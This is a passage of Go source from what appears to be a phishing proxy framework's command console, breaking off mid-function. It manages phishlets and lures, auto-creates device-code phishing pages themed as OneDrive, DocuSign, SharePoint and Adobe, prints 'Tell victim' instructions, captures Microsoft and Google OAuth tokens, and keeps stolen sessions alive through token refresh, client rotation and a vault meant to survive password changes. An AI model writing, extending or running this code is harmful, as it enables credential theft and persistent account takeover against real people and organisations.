func (t *Terminal) handlePhishlets(args []string) error {
	pn := len(args)

	if pn >= 3 && args[0] == "create" {
		pl, err := t.cfg.GetPhishlet(args[1])
		if err == nil {
			params := make(map[string]string)

			var create_ok bool = true
			if pl.isTemplate {
				for n := 3; n < pn; n++ {
					val := args[n]

					sp := strings.Index(val, "=")
					if sp == -1 {
						return fmt.Errorf("set custom parameters for the child phishlet using format 'param1=value1 param2=value2'")
					}
					k := val[:sp]
					v := val[sp+1:]

					params[k] = v

					log.Info("adding parameter: %s='%s'", k, v)
				}
			}

			if create_ok {
				child_name := args[1] + ":" + args[2]
				err := t.cfg.AddSubPhishlet(child_name, args[1], params)
				if err != nil {
					log.Error("%v", err)
				} else {
					t.cfg.SaveSubPhishlets()
					log.Info("created child phishlet: %s", child_name)
				}
			}
			return nil
		} else {
			log.Error("%v", err)
		}
	} else if pn == 0 {
		t.output("%s", t.sprintPhishletStatus(""))
		return nil
	} else if pn == 1 {
		_, err := t.cfg.GetPhishlet(args[0])
		if err == nil {
			t.output("%s", t.sprintPhishletStatus(args[0]))
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "delete":
			err := t.cfg.DeleteSubPhishlet(args[1])
			if err != nil {
				log.Error("%v", err)
				return nil
			}
			t.cfg.SaveSubPhishlets()
			log.Info("deleted child phishlet: %s", args[1])
			return nil
		case "enable":
			pl, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				log.Error("%v", err)
				break
			}
			if pl.isTemplate {
				return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", args[1])
			}
			err = t.cfg.SetSiteEnabled(args[1])
			if err != nil {
				t.cfg.SetSiteDisabled(args[1])
				return err
			}
			t.manageCertificates(true)
			return nil
		case "disable":
			err := t.cfg.SetSiteDisabled(args[1])
			if err != nil {
				return err
			}
			t.manageCertificates(false)
			return nil
		case "hide":
			err := t.cfg.SetSiteHidden(args[1], true)
			if err != nil {
				return err
			}
			return nil
		case "unhide":
			err := t.cfg.SetSiteHidden(args[1], false)
			if err != nil {
				return err
			}
			return nil
		case "get-hosts":
			pl, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			bhost, ok := t.cfg.GetSiteDomain(pl.Name)
			if !ok || len(bhost) == 0 {
				return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
			}
			out := ""
			hosts := pl.GetPhishHosts(false)
			for n, h := range hosts {
				if n > 0 {
					out += "\n"
				}
				out += t.cfg.GetServerExternalIP() + " " + h
			}
			t.output("%s\n", out)
			return nil
		}
	} else if pn == 3 {
		switch args[0] {
		case "hostname":
			_, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			if ok := t.cfg.SetSiteHostname(args[1], args[2]); ok {
				t.cfg.SetSiteDisabled(args[1])
				t.manageCertificates(false)
			}
			return nil
		case "unauth_url":
			_, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			t.cfg.SetSiteUnauthUrl(args[1], args[2])
			return nil
		case "domain":
			// Multi-domain support: assign a base domain to a phishlet
			_, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			t.cfg.SetSiteDomain(args[1], args[2])
			return nil
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleLures(args []string) error {
	hiblue := color.New(color.FgHiBlue)
	yellow := color.New(color.FgYellow)
	higreen := color.New(color.FgHiGreen)
	green := color.New(color.FgGreen)
	//hiwhite := color.New(color.FgHiWhite)
	hcyan := color.New(color.FgHiCyan)
	cyan := color.New(color.FgCyan)
	dgray := color.New(color.FgHiBlack)
	white := color.New(color.FgHiWhite)

	pn := len(args)

	if pn == 0 {
		// list lures
		t.output("%s", t.sprintLures())
		return nil
	}
	if pn > 0 {
		switch args[0] {
		case "create":
			if pn == 2 {
				_, err := t.cfg.GetPhishlet(args[1])
				if err != nil {
					return err
				}

				// Create 6 lures automatically - one for each device code theme
				themes := []struct {
					name  string
					label string
				}{
					{"", "Default"},
					{"onedrive", "OneDrive"},
					{"authenticator", "Authenticator"},
					{"adobe", "Adobe PDF"},
					{"docusign", "DocuSign"},
					{"sharepoint", "SharePoint"},
				}

				startID := len(t.cfg.lures)
				for i, theme := range themes {
					l := &Lure{
						Path:             "/" + GenRandomLurePath(),
						Phishlet:         args[1],
						DeviceCodeTheme:  theme.name,
						DeviceCodeMode:   DCModeAlways,
						DeviceCodeClient: "ms_office",
					}
					t.cfg.AddLure(args[1], l)
					lureID := startID + i
					themeName := theme.label
					if theme.name == "" {
						themeName = "Default"
					}
					log.Info("created lure ID: %d  [%s]", lureID, themeName)
				}
				log.Success("created %d themed lures (IDs %d-%d) for phishlet '%s'", len(themes), startID, startID+len(themes)-1, args[1])
				log.Info("use 'lures get-url <id>' to get the themed URL for each lure")
				return nil
			}
			return fmt.Errorf("incorrect number of arguments")
		case "get-url":
			if pn >= 2 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("get-url: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("get-url: %v", err)
				}
				pl, err := t.cfg.GetPhishlet(l.Phishlet)
				if err != nil {
					return fmt.Errorf("get-url: %v", err)
				}
				bhost, ok := t.cfg.GetSiteDomain(pl.Name)
				if !ok || len(bhost) == 0 {
					return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
				}

				var base_url string
				if l.Hostname != "" {
					// Custom hostname is set for the lure
					base_url = "https://" + l.Hostname + l.Path
				} else {
					// Multi-domain support: Check for lure domain override, then phishlet domain
					effectiveDomain, err := t.cfg.GetLureDomain(l_id)
					if err != nil {
						return fmt.Errorf("get-url: %v", err)
					}

					// If lure or phishlet has a different domain than the phishlet hostname,
					// recalculate the URL using that domain
					if effectiveDomain != "" && effectiveDomain != t.cfg.GetBaseDomain() {
						// Check if phishlet hostname ends with a different domain
						if !strings.HasSuffix(bhost, "."+effectiveDomain) && bhost != effectiveDomain {
							// Get landing host subdomain and combine with effective domain
							landingHost := pl.GetLandingPhishHost()
							if landingHost != "" {
								// Extract subdomain from landing host
								parts := strings.SplitN(landingHost, ".", 2)
								if len(parts) > 0 {
									base_url = "https://" + parts[0] + "." + effectiveDomain + l.Path
								} else {
									base_url = "https://" + effectiveDomain + l.Path
								}
							} else {
								base_url = "https://" + effectiveDomain + l.Path
							}
						} else {
							purl, err := pl.GetLureUrl(l.Path)
							if err != nil {
								return err
							}
							base_url = purl
						}
					} else {
						purl, err := pl.GetLureUrl(l.Path)
						if err != nil {
							return err
						}
						base_url = purl
					}
				}

				var phish_urls []string
				var phish_params []map[string]string
				var out string

				params := url.Values{}
				if pn > 2 {
					if args[2] == "import" {
						if pn < 4 {
							return fmt.Errorf("get-url: no import path specified")
						}
						params_file := args[3]

						phish_urls, phish_params, err = t.importParamsFromFile(base_url, params_file)
						if err != nil {
							return fmt.Errorf("get_url: %v", err)
						}

						if pn >= 5 {
							if args[4] == "export" {
								if pn == 5 {
									return fmt.Errorf("get-url: no export path specified")
								}
								export_path := args[5]

								format := "text"
								if pn == 7 {
									format = args[6]
								}

								err = t.exportPhishUrls(export_path, phish_urls, phish_params, format)
								if err != nil {
									return fmt.Errorf("get-url: %v", err)
								}
								out = hiblue.Sprintf("exported %d phishing urls to file: %s\n", len(phish_urls), export_path)
								phish_urls = []string{}
							} else {
								return fmt.Errorf("get-url: expected 'export': %s", args[4])
							}
						}

					} else {
						// params present
						for n := 2; n < pn; n++ {
							val := args[n]

							sp := strings.Index(val, "=")
							if sp == -1 {
								return fmt.Errorf("to set custom parameters for the phishing url, use format 'param1=value1 param2=value2'")
							}
							k := val[:sp]
							v := val[sp+1:]

							params.Add(k, v)

							log.Info("adding parameter: %s='%s'", k, v)
						}
						phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
					}
				} else {
					phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
				}

				for n, phish_url := range phish_urls {
					out += hiblue.Sprint(phish_url)

					var params_row string
					var params string
					if len(phish_params) > 0 {
						params_row := phish_params[n]
						m := 0
						for k, v := range params_row {
							if m > 0 {
								params += " "
							}
							params += fmt.Sprintf("%s=\"%s\"", k, v)
							m += 1
						}
					}

					if len(params_row) > 0 {
						out += " ; " + params
					}
					out += "\n"
				}

				// Show theme label if this lure has a dc_theme set
				dcTheme := l.DeviceCodeTheme
				if dcTheme != "" {
					themeLabels := map[string]string{
						"onedrive":      "OneDrive",
						"authenticator": "Authenticator",
						"adobe":         "Adobe PDF",
						"docusign":      "DocuSign",
						"sharepoint":    "SharePoint",
					}
					label := themeLabels[dcTheme]
					if label == "" {
						label = dcTheme
					}
					out += color.New(color.FgHiCyan).Sprintf("  theme: %s", label) + "\n"
				}

				t.output("%s", out)
				return nil
			}
			return fmt.Errorf("incorrect number of arguments")
		case "pause":
			if pn == 3 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				s_duration := args[2]

				t_dur, err := ParseDurationString(s_duration)
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				t_now := time.Now()
				log.Info("current time: %s", t_now.Format("2006-01-02 15:04:05"))
				log.Info("unpauses at:  %s", t_now.Add(t_dur).Format("2006-01-02 15:04:05"))

				l.PausedUntil = t_now.Add(t_dur).Unix()
				err = t.cfg.SetLure(l_id, l)
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				return nil
			}
		case "unpause":
			if pn == 2 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}

				log.Info("lure for phishlet '%s' unpaused", l.Phishlet)

				l.PausedUntil = 0
				err = t.cfg.SetLure(l_id, l)
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				return nil
			}
		case "edit":
			if pn == 4 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				val := args[3]
				do_update := false

				switch args[2] {
				case "hostname":
					if val != "" {
						val = strings.ToLower(val)

						// Multi-domain support: validate against all registered domains
						validDomain := false
						if t.cfg.general.Domain != "" {
							if val == t.cfg.general.Domain || strings.HasSuffix(val, "."+t.cfg.general.Domain) {
								validDomain = true
							}
						}
						for _, d := range t.cfg.externalDomains {
							if val == d.Domain || strings.HasSuffix(val, "."+d.Domain) {
								validDomain = true
								break
							}
						}
						if !validDomain {
							domains := t.cfg.GetAllDomains()
							return fmt.Errorf("edit: lure hostname must match one of: %s", strings.Join(domains, ", "))
						}
						host_re := regexp.MustCompile(`^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$`)
						if !host_re.MatchString(val) {
							return fmt.Errorf("edit: invalid hostname")
						}

						l.Hostname = val
						t.cfg.refreshActiveHostnames()
						t.manageCertificates(true)
					} else {
						l.Hostname = ""
					}
					do_update = true
					log.Info("hostname = '%s'", l.Hostname)
				case "path":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						l.Path = u.EscapedPath()
						if len(l.Path) == 0 || l.Path[0] != '/' {
							l.Path = "/" + l.Path
						}
					} else {
						l.Path = "/"
					}
					do_update = true
					log.Info("path = '%s'", l.Path)
				case "redirect_url":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						if !u.IsAbs() {
							return fmt.Errorf("edit: redirect url must be absolute")
						}
						l.RedirectUrl = u.String()
					} else {
						l.RedirectUrl = ""
					}
					do_update = true
					log.Info("redirect_url = '%s'", l.RedirectUrl)
				case "phishlet":
					_, err := t.cfg.GetPhishlet(val)
					if err != nil {
						return fmt.Errorf("edit: %v", err)
					}
					l.Phishlet = val
					do_update = true
					log.Info("phishlet = '%s'", l.Phishlet)
				case "info":
					l.Info = val
					do_update = true
					log.Info("info = '%s'", l.Info)
				case "og_title":
					l.OgTitle = val
					do_update = true
					log.Info("og_title = '%s'", l.OgTitle)
				case "og_desc":
					l.OgDescription = val
					do_update = true
					log.Info("og_desc = '%s'", l.OgDescription)
				case "og_image":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						if !u.IsAbs() {
							return fmt.Errorf("edit: image url must be absolute")
						}
						l.OgImageUrl = u.String()
					} else {
						l.OgImageUrl = ""
					}
					do_update = true
					log.Info("og_image = '%s'", l.OgImageUrl)
				case "og_url":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						if !u.IsAbs() {
							return fmt.Errorf("edit: site url must be absolute")
						}
						l.OgUrl = u.String()
					} else {
						l.OgUrl = ""
					}
					do_update = true
					log.Info("og_url = '%s'", l.OgUrl)
				case "redirector":
					if val != "" {
						path := val
						if !filepath.IsAbs(val) {
							redirectors_dir := t.cfg.GetRedirectorsDir()
							path = filepath.Join(redirectors_dir, val)
						}

						if _, err := os.Stat(path); !os.IsNotExist(err) {
							l.Redirector = val
						} else {
							return fmt.Errorf("edit: redirector directory does not exist: %s", path)
						}
					} else {
						l.Redirector = ""
					}
					do_update = true
					log.Info("redirector = '%s'", l.Redirector)
				case "ua_filter":
					if val != "" {
						if _, err := regexp.Compile(val); err != nil {
							return err
						}

						l.UserAgentFilter = val
					} else {
						l.UserAgentFilter = ""
					}
					do_update = true
					log.Info("ua_filter = '%s'", l.UserAgentFilter)
				case "domain":
					// Multi-domain support: set domain override for this lure
					err := t.cfg.SetLureDomain(l_id, val)
					if err != nil {
						return fmt.Errorf("edit: %v", err)
					}
					// Update the lure's domain field directly
					l.Domain = val
					do_update = true
				case "devicecode":
					val = strings.ToLower(val)
					if val != DCModeOff && val != DCModeAlways && val != DCModeFallback && val != DCModeAuto && val != DCModeDirect {
						return fmt.Errorf("edit: invalid device code mode '%s' (valid: off, always, fallback, auto, direct)", val)
					}
					l.DeviceCodeMode = val
					do_update = true
					log.Info("lure '%d' device code mode set to: %s", l_id, val)
				case "dc_client":
					val = strings.ToLower(val)
					if _, ok := KnownClientIDs[val]; !ok {
						valid := []string{}
						for k := range KnownClientIDs {
							valid = append(valid, k)
						}
						return fmt.Errorf("edit: unknown client '%s' (valid: %s)", val, strings.Join(valid, ", "))
					}
					l.DeviceCodeClient = val
					do_update = true
					log.Info("lure '%d' device code client set to: %s", l_id, val)
				case "dc_scope":
					val = strings.ToLower(val)
					if _, ok := ScopePresets[val]; !ok {
						valid := []string{}
						for k := range ScopePresets {
							valid = append(valid, k)
						}
						return fmt.Errorf("edit: unknown scope preset '%s' (valid: %s)", val, strings.Join(valid, ", "))
					}
					l.DeviceCodeScope = val
					do_update = true
					log.Info("lure '%d' device code scope set to: %s", l_id, val)
				case "dc_template":
					val = strings.ToLower(val)
					if val != "success" && val != "fallback" && val != "compliance" {
						return fmt.Errorf("edit: invalid template '%s' (valid: success, fallback, compliance)", val)
					}
					l.DeviceCodeTemplate = val
					do_update = true
					log.Info("lure '%d' device code template set to: %s", l_id, val)
				case "dc_theme":
					val = strings.ToLower(val)
					validThemes := []string{"default", "onedrive", "authenticator", "adobe", "docusign", "sharepoint"}
					valid := false
					for _, vt := range validThemes {
						if val == vt {
							valid = true
							break
						}
					}
					if !valid {
						return fmt.Errorf("edit: invalid theme '%s' (valid: default, onedrive, authenticator, adobe, docusign, sharepoint)", val)
					}
					if val == "default" {
						val = ""
					}
					l.DeviceCodeTheme = val
					do_update = true
					if val == "" {
						log.Info("lure '%d' device code theme set to: default", l_id)
					} else {
						log.Info("lure '%d' device code theme set to: %s", l_id, val)
					}
				case "dc_provider":
					val = strings.ToLower(val)
					if !IsValidDCProvider(val) {
						return fmt.Errorf("edit: invalid provider '%s' (valid: microsoft, google)", val)
					}
					l.DeviceCodeProvider = val
					do_update = true
					// Auto-set default client if not already set or mismatched
					if l.DeviceCodeClient == "" || GetProviderForClient(l.DeviceCodeClient) != val {
						if val == DCProviderGoogle {
							l.DeviceCodeClient = "google_cloud_sdk"
							l.DeviceCodeScope = "gworkspace"
						} else {
							l.DeviceCodeClient = "ms_office"
							l.DeviceCodeScope = "full"
						}
						log.Info("lure '%d' auto-set dc_client=%s dc_scope=%s for provider %s", l_id, l.DeviceCodeClient, l.DeviceCodeScope, val)
					}
					log.Info("lure '%d' device code provider set to: %s", l_id, val)
				}
				if do_update {
					err := t.cfg.SetLure(l_id, l)
					if err != nil {
						return fmt.Errorf("edit: %v", err)
					}
					return nil
				}
			} else {
				return fmt.Errorf("incorrect number of arguments")
			}
		case "delete":
			if pn == 2 {
				if len(t.cfg.lures) == 0 {
					break
				}
				if args[1] == "all" {
					di := []int{}
					for n := range t.cfg.lures {
						di = append(di, n)
					}
					if len(di) > 0 {
						rdi := t.cfg.DeleteLures(di)
						for _, id := range rdi {
							log.Info("deleted lure with ID: %d", id)
						}
					}
					return nil
				} else {
					rc := strings.Split(args[1], ",")
					di := []int{}
					for _, pc := range rc {
						pc = strings.TrimSpace(pc)
						rd := strings.Split(pc, "-")
						if len(rd) == 2 {
							b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
							if err != nil {
								return fmt.Errorf("delete: %v", err)
							}
							e_id, err := strconv.Atoi(strings.TrimSpace(rd[1]))
							if err != nil {
								return fmt.Errorf("delete: %v", err)
							}
							for i := b_id; i <= e_id; i++ {
								di = append(di, i)
							}
						} else if len(rd) == 1 {
							b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
							if err != nil {
								return fmt.Errorf("delete: %v", err)
							}
							di = append(di, b_id)
						}
					}
					if len(di) > 0 {
						rdi := t.cfg.DeleteLures(di)
						for _, id := range rdi {
							log.Info("deleted lure with ID: %d", id)
						}
					}
					return nil
				}
			}
			return fmt.Errorf("incorrect number of arguments")
		default:
			id, err := strconv.Atoi(args[0])
			if err != nil {
				return err
			}
			l, err := t.cfg.GetLure(id)
			if err != nil {
				return err
			}

			var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))

			// Device code details
			dcMode := l.DeviceCodeMode
			if dcMode == "" {
				dcMode = "always"
			}
			dcTheme := l.DeviceCodeTheme
			if dcTheme == "" {
				dcTheme = "default"
			}
			dcClient := l.DeviceCodeClient
			if dcClient == "" {
				dcClient = "-"
			}
			dcScope := l.DeviceCodeScope
			if dcScope == "" {
				dcScope = "-"
			}

			keys := []string{"phishlet", "hostname", "path", "redirector", "ua_filter", "redirect_url", "paused", "info", "og_title", "og_desc", "og_image", "og_url", "dc_mode", "dc_theme", "dc_client", "dc_scope"}
			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), s_paused, l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl), hiblue.Sprint(dcMode), hcyan.Sprint(dcTheme), green.Sprint(dcClient), green.Sprint(dcScope)}
			log.Printf("\n%s\n", AsRows(keys, vals))

			return nil
		}
	}

	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleDeviceCode(args []string) error {
	hiblue := color.New(color.FgHiBlue)
	higreen := color.New(color.FgHiGreen)
	hiyellow := color.New(color.FgHiYellow)
	hired := color.New(color.FgHiRed)
	white := color.New(color.FgHiWhite)
	cyan := color.New(color.FgHiCyan)

	pn := len(args)
	if pn == 0 {
		// Show device code status
		dcm := t.p.deviceCode
		sessions := dcm.GetAllSessions()

		if len(sessions) == 0 {
			log.Info("no device code sessions")
			t.output("\n")
			t.output(" tenant : %s\n", white.Sprint(dcm.GetTenant()))
			t.output("\n")
			return nil
		}

		t.output("\n")
		t.output(" tenant : %s\n", white.Sprint(dcm.GetTenant()))
		t.output(" active : %s sessions\n\n", white.Sprint(len(sessions)))

		cols := []string{"id", "provider", "state", "client", "code", "user", "expires/captured", "linked"}
		var rows [][]string

		for _, s := range sessions {
			s.mu.Lock()
			state := s.State
			stateStr := ""
			switch state {
			case DCStateWaiting:
				remaining := time.Until(s.ExpiresAt)
				if remaining > 0 {
					stateStr = hiyellow.Sprintf("waiting (%s)", remaining.Truncate(time.Second))
				} else {
					stateStr = hired.Sprint("expired")
				}
			case DCStateCaptured:
				stateStr = higreen.Sprint("CAPTURED")
			case DCStateExpired:
				stateStr = hired.Sprint("expired")
			case DCStateFailed:
				stateStr = hired.Sprintf("failed: %s", s.Error)
			case DCStateCancelled:
				stateStr = hired.Sprint("cancelled")
			}

			user := "-"
			if s.UserInfo != nil {
				user = s.UserInfo.UserPrincipalName
			} else if s.GoogleUser != nil {
				user = s.GoogleUser.Email
				if s.GoogleUser.HD != "" {
					user += " [" + s.GoogleUser.HD + "]"
				}
			}

			providerStr := s.Provider
			if providerStr == "" {
				providerStr = DCProviderMicrosoft
			}
			if providerStr == DCProviderGoogle {
				providerStr = higreen.Sprint(providerStr)
			} else {
				providerStr = hiblue.Sprint(providerStr)
			}

			timeStr := ""
			if state == DCStateCaptured {
				timeStr = s.CapturedAt.Format("15:04:05")
			} else if state == DCStateWaiting {
				timeStr = s.ExpiresAt.Format("15:04:05")
			}

			linked := "-"
			if s.LinkedSession != "" {
				linked = s.LinkedSession[:8] + "..."
			}

			rows = append(rows, []string{
				s.ID,
				providerStr,
				stateStr,
				s.ClientName,
				s.UserCode,
				user,
				timeStr,
				linked,
			})
			s.mu.Unlock()
		}

		t.output("%s\n", AsTable(cols, rows))

		return nil
	}

	switch args[0] {
	case "tenant":
		if pn == 2 {
			t.p.deviceCode.SetTenant(args[1])
			log.Info("device code tenant set to: %s", args[1])
			return nil
		}
		log.Info("current tenant: %s", t.p.deviceCode.GetTenant())
		return nil

	case "generate":
		if pn >= 2 {
			clientAlias := args[1]
			scope := "full"
			if pn >= 3 {
				scope = args[2]
			}

			dcSess, err := t.p.deviceCode.RequestDeviceCode(clientAlias, scope)
			if err != nil {
				return err
			}

			t.output("\n")
			t.output("  %s Device code generated\n\n", higreen.Sprint("✓"))
			t.output("  session_id  : %s\n", white.Sprint(dcSess.ID))
			t.output("  client      : %s\n", hiblue.Sprint(dcSess.ClientName))
			t.output("  user_code   : %s\n", cyan.Sprint(dcSess.UserCode))
			t.output("  verify_url  : %s\n", white.Sprint(dcSess.VerifyURL))
			t.output("  expires_in  : %s\n", white.Sprintf("%ds", int(time.Until(dcSess.ExpiresAt).Seconds())))
			t.output("\n")
			t.output("  Tell victim: Go to %s and enter code %s\n\n", hiblue.Sprint(dcSess.VerifyURL), cyan.Sprint(dcSess.UserCode))

			return nil
		}

	case "autopoll":
		if pn >= 2 {
			clientAlias := args[1]
			scope := "full"
			if pn >= 3 {
				scope = args[2]
			}

			dcSess, err := t.p.deviceCode.RequestDeviceCode(clientAlias, scope)
			if err != nil {
				return err
			}

			if err := t.p.deviceCode.StartPolling(dcSess.ID); err != nil {
				return err
			}

			t.output("\n")
			t.output("  %s Device code generated + polling started\n\n", higreen.Sprint("✓"))
			t.output("  session_id  : %s\n", white.Sprint(dcSess.ID))
			t.output("  client      : %s\n", hiblue.Sprint(dcSess.ClientName))
			t.output("  user_code   : %s\n", cyan.Sprint(dcSess.UserCode))
			t.output("  verify_url  : %s\n", white.Sprint(dcSess.VerifyURL))
			t.output("  expires_in  : %s\n", white.Sprintf("%ds", int(time.Until(dcSess.ExpiresAt).Seconds())))
			t.output("\n")
			t.output("  Tell victim: Go to %s and enter code %s\n\n", hiblue.Sprint(dcSess.VerifyURL), cyan.Sprint(dcSess.UserCode))

			return nil
		}

	case "poll":
		if pn == 2 {
			err := t.p.deviceCode.StartPolling(args[1])
			if err != nil {
				return err
			}
			log.Info("[devicecode] polling started for session %s", args[1])
			return nil
		}

	case "tokens":
		if pn == 2 {
			exported, err := t.p.deviceCode.ExportTokens(args[1])
			if err != nil {
				return err
			}
			t.output("\n%s\n\n", exported)
			return nil
		}

	case "userinfo":
		if pn == 2 {
			dcSess, ok := t.p.deviceCode.GetSession(args[1])
			if !ok {
				return fmt.Errorf("session not found: %s", args[1])
			}
			dcSess.mu.Lock()
			user := dcSess.UserInfo
			dcSess.mu.Unlock()

			if user == nil {
				return fmt.Errorf("no user info available (tokens may not be captured yet)")
			}

			t.output("\n")
			t.output("  Display Name : %s\n", white.Sprint(user.DisplayName))
			t.output("  UPN          : %s\n", white.Sprint(user.UserPrincipalName))
			t.output("  Email        : %s\n", white.Sprint(user.Mail))
			t.output("  ID           : %s\n", white.Sprint(user.ID))
			t.output("  Job Title    : %s\n", white.Sprint(user.JobTitle))
			t.output("  Office       : %s\n", white.Sprint(user.OfficeLocation))
			t.output("  Phone        : %s\n", white.Sprint(user.MobilePhone))
			t.output("\n")
			return nil
		}

	case "refresh":
		if pn == 2 {
			if args[1] == "all" {
				// Force refresh all tokens
				if t.tokenAutoRefresh != nil {
					log.Info("[autorefresh] Forcing refresh of all tokens...")
					go func() {
						sessions, err := t.db.ListSessions()
						if err != nil {
							log.Error("[autorefresh] Failed to list sessions: %v", err)
							return
						}
						refreshed := 0
						for _, s := range sessions {
							if s.Custom != nil {
								if rt, ok := s.Custom["dc_refresh_token"]; ok && rt != "" {
									err := t.tokenAutoRefresh.RefreshSessionToken(s.SessionId)
									if err != nil {
										log.Warning("[autorefresh] [%d] %s: %v", s.Id, s.Username, err)
									} else {
										refreshed++
									}
								}
							}
						}
						log.Success("[autorefresh] Refreshed %d tokens", refreshed)
					}()
				}
				return nil
			}
			err := t.p.deviceCode.RefreshAccessToken(args[1])
			if err != nil {
				return err
			}
			return nil
		}

	case "status":
		// Show comprehensive auto-refresh and health status
		if t.tokenAutoRefresh != nil {
			total, withRefresh := t.tokenAutoRefresh.GetRefreshStats()
			running := t.tokenAutoRefresh.IsRunning()
			statusColor := hiyellow
			statusText := "STOPPED"
			if running {
				statusColor = higreen
				statusText = "RUNNING"
			}
			t.output("\n  %s Token Keep-Alive System\n", white.Sprint("🔄"))
			t.output("  %-24s %s\n", "Status:", statusColor.Sprint(statusText))
			t.output("  %-24s %v\n", "Uptime:", t.tokenAutoRefresh.GetUptime().Round(time.Second))
			t.output("  %-24s %d\n", "Total sessions:", total)
			t.output("  %-24s %d\n", "With refresh token:", withRefresh)
			t.output("  %-24s %d\n", "Total refreshes:", t.tokenAutoRefresh.GetTotalRefreshCount())
			t.output("  %-24s %v (primary) / %v (keep-alive)\n", "Refresh interval:", TOKEN_REFRESH_INTERVAL, TOKEN_KEEPALIVE_INTERVAL)
			t.output("  %-24s %d FOCI clients\n", "Client rotation:", len(FOCIClientIDs))
			t.output("  %-24s %d scopes\n", "Scope warming:", len(WarmingScopes))

			// Show per-session health
			healthReport := t.tokenAutoRefresh.GetHealthReport()
			if len(healthReport) > 0 {
				t.output("\n  %s Session Health\n", white.Sprint("💊"))
				t.output("  %-6s %-30s %-10s %-10s %-10s %-20s %s\n",
					white.Sprint("ID"), white.Sprint("User"), white.Sprint("Status"),
					white.Sprint("Refreshes"), white.Sprint("Failures"), white.Sprint("Last Refresh"), white.Sprint("FOCI Client"))
				t.output("  %-6s %-30s %-10s %-10s %-10s %-20s %s\n",
					"--", "----", "------", "---------", "--------", "------------", "-----------")
				for _, h := range healthReport {
					var statusC *color.Color
					switch h.Status {
					case "healthy":
						statusC = higreen
					case "degraded":
						statusC = hiyellow
					case "dead":
						statusC = hired
					default:
						statusC = white
					}
					username := h.Username
					if len(username) > 28 {
						username = username[:28] + ".."
					}
					lastRefresh := "never"
					if !h.LastRefreshTime.IsZero() {
						lastRefresh = h.LastRefreshTime.Format("15:04:05")
					}
					clientName := "default"
					if h.CurrentClientIdx < len(FOCIClientIDs) {
						clientName = FOCIClientIDs[h.CurrentClientIdx].Name
					}
					if len(clientName) > 18 {
						clientName = clientName[:18]
					}
					t.output("  %-6d %-30s %-10s %-10d %-10d %-20s %s\n",
						h.DBId, username, statusC.Sprint(h.Status),
						h.TotalRefreshes, h.ConsecutiveFailures, lastRefresh, clientName)
				}
			}
			t.output("\n")
		}

		// Show Token Persistence Vault stats
		if t.tokenPersistence != nil {
			totalVaults, totalTokens, validTokens, anchoredSessions := t.tokenPersistence.GetAllVaultStats()
			vaultStatus := hiyellow
			vaultText := "STANDBY"
			if validTokens > 0 {
				vaultStatus = higreen
				vaultText = "PROTECTED"
			}
			t.output("  %s Token Persistence Vault (Password-Change Survival)\n", white.Sprint("🛡️"))
			t.output("  %-24s %s\n", "Vault status:", vaultStatus.Sprint(vaultText))
			t.output("  %-24s %d\n", "Session vaults:", totalVaults)
			t.output("  %-24s %d total / %d valid\n", "Vault tokens:", totalTokens, validTokens)
			t.output("  %-24s %d\n", "Anchored sessions:", anchoredSessions)
			t.output("  %-24s %v\n", "Vault refresh interval:", VAULT_REFRESH_INTERVAL)
			t.output("  %-24s %v\n", "Anchor interval:", SESSION_ANCHOR_INTERVAL)
			t.output("  %-24s %d services\n", "Service coverage:", len(VaultServices))
			t.output("  %-24s %d non-CAE clients\n", "Client pool:", len(NonCAEClients))
			t.output("\n")
		}

		// Show proxy connection stats
		if t.p != nil {
			stats := t.p.GetConnectionStats()
			t.output("  %s Proxy Connection Stats\n", white.Sprint("📊"))
